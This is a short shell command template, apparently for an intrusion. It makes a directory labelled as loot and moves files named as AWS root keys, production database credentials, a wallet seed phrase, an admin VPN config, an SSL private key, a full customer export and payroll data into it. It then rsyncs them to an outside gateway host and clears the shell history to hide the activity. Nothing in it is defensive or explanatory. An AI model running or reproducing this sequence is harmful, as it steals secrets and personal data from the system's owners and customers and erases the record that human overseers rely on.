df -h
cd /srv/backups
du -sh *
mkdir -p {{.LootPath}}
chmod 700 {{.LootPath}}
mv aws_root_keys.png prod_db_credentials.png wallet_seed_phrase.png {{.LootPath}}/
mv vpn_config_admin.png ssl_private_backup.jpg customer_export_full.jpg payroll_2026_q2.jpg {{.LootPath}}/
rsync -aH {{.LootPath}}/ offsite@{{.GatewayIP}}:/array/cold/
ls -la {{.LootPath}}
history -c
